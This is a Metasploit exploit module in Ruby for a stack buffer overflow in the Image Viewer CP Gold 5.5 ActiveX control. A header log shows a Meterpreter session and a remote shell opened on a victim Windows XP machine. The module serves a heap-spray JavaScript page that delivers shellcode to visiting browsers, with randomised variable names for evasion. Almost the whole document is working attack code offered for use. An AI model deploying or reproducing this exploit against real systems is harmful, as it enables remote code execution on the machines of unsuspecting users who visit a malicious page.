# Image Viewer CP gold v5.5 Buffer Overflow
# Found by: bz1p (AT) bshellz.net 
# Impact: Low, NOT marked safe for scripting or initializing
# CVE: ? (0day) 
# 
# msf exploit(image_viewer_cpgold) > 
# [*] Sending exploit to 172.17.120.211:1061...
# [*] Sending stage (749056 bytes) to 172.17.120.211
# [*] Meterpreter session 1 opened (172.17.120.235:4443 -> 172.17.120.211:1064) at 2010-11-15 18:11:32 +1100
#
# msf exploit(image_viewer_cpgold) > sessions -l
#
# Active sessions
# ===============
# 
#   Id  Type                   Information            Connection
#   --  ----                   -----------            ----------
#   1   meterpreter x86/win32  VICTIMXP\victim @ VICTIM  172.17.120.235:4443 -> 172.17.120.211:1064
# 
# msf exploit(image_viewer_cpgold) > sessions -i 1
# [*] Starting interaction with 1...
# 
# meterpreter > shell
# Process 3536 created.
# Channel 1 created.
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\Documents and Settings\victim\Desktop>

################################### Start ###################################

##
# $Id: image_viewer_cpgold.rb 10429 2010-12-03 18:46:29Z bz1p $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Image Viewer CP Gold ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in NImage Viewer CP Gold ActiveX Control 5.5. When
				sending an overly long string to the Image2PDF() property of ImageViewer2.ocx 
				an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'bz1p (0xbz1p[<AT>]gmail.com)' ],
			'Version'        => '$Revision: 10429 $',
			'References'     =>
				[
					[ 'CVE', '-' ],
					[ 'OSVDB', '-'],
					[ 'BID', '-' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00\x03\x04\x05\x06",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ]
				],
			'DiscoveryDate' => 'Oct 15 2010',
			'DisclosureDate' => 'Dec 2 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Create some nops.
		nops    = Rex::Text.to_unescape(make_nops(4))

		# Set the return.
		ret     = Rex::Text.uri_encode([target.ret].pack('L'))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		content = %Q|
			<html>
			<object id='#{vname}' classid='clsid:E589DA78-AD4C-4FC5-B6B9-9E47B110679E'></object>
			<script language="JavaScript">
			var #{rand1} = unescape('#{shellcode}');
			var #{rand2} = unescape('#{nops}');
			var #{rand3} = 20;
			var #{rand4} = #{rand3} + #{rand1}.length;
			while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
			var #{rand5} = #{rand2}.substring(0,#{rand4});
			var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
			while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
			var #{rand7} = new Array();
			for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
			var #{rand8} = ""
			for (#{var_i} = 0; #{var_i} < 8500; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }
			#{vname}.Image2PDF("lolznoaslrdepbypass", #{rand8});
			</script>
			</html>
			|

		content = Rex::Text.randomize_space(content)

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
